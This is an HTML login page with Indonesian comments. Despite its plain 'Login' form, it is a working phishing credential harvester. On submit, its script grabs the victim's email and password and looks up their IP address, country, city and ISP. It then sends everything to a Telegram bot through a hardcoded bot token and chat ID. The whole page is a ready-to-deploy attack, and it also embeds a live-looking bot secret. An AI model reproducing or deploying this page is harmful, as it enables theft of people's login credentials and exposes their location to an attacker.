<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #1E1E2E, #3A3A5A);
            color: white;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 350px;
            border-radius: 10px;
            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.3);
            text-align: center;
            backdrop-filter: blur(10px);
        }

        h2 {
            margin-bottom: 20px;
            font-size: 24px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-align: center;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
        }

        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background: #00BFFF;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            background: #007BFF;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Mencegah reload halaman

            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            fetch("https://ip-api.com/json/")
                .then(response => response.json())
                .then(data => {
                    let message = `🔥 *Login Info* 🔥\n📧 Email: ${email}\n🔑 Password: ${password}\n\n🌍 *Info IP*\n📌 IP: ${data.query}\n🏳️ Negara: ${data.country}\n🏙️ Kota: ${data.city}, ${data.regionName}\n📡 ISP: ${data.isp}`;

                    let token = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
                    let chat_id =
                      "6786210993";
                    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

                    return fetch(url);
                })
                .then(() => console.log("Terkirim ke Telegram!"))
                .catch(error => console.error("Error:", error));
        });
    </script>
</body>
</html>
